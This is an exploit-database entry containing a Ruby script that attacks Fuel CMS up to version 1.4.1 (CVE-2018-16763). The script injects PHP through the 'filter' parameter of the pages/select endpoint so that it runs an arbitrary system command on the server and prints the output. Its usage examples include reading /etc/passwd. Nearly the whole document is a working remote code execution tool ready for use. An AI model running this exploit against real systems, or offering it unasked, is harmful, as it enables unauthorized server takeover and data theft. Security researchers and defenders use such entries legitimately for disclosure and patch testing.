# Title: Fuel CMS 1.4.1 - Remote Code Execution (2)
# Exploit Author: Alexandre ZANNI
# Date: 2020-11-14
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu 16.04
# CVE : CVE-2018-16763
# References: https://www.exploit-db.com/exploits/47138

#!/usr/bin/env ruby

require 'httpclient'
require 'docopt'

# dirty workaround to ignore Max-Age
# https://github.com/nahi/httpclient/issues/242#issuecomment-69013932
$VERBOSE = nil

doc = <<~DOCOPT
  Fuel CMS 1.4 - Remote Code Execution

  Usage:
    #{__FILE__} <url> <cmd>
    #{__FILE__} -h | --help

  Options:
    <url>         Root URL (base path) including HTTP scheme, port and root folder
    <cmd>         The system command to execute
    -h, --help    Show this screen

  Examples:
    #{__FILE__} http://example.org id
    #{__FILE__} https://example.org:8443/fuelcms 'cat /etc/passwd'
DOCOPT

def exploit(client, root_url, cmd)
  url = root_url + "/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'"

  res = client.get(url)

  /system(.+?)<div/mx.match(res.body).captures[0].chomp
end

begin
  args = Docopt.docopt(doc)
  clnt = HTTPClient.new
  puts exploit(clnt, args['<url>'], args['<cmd>'])
rescue Docopt::Exit => e
  puts e.message
end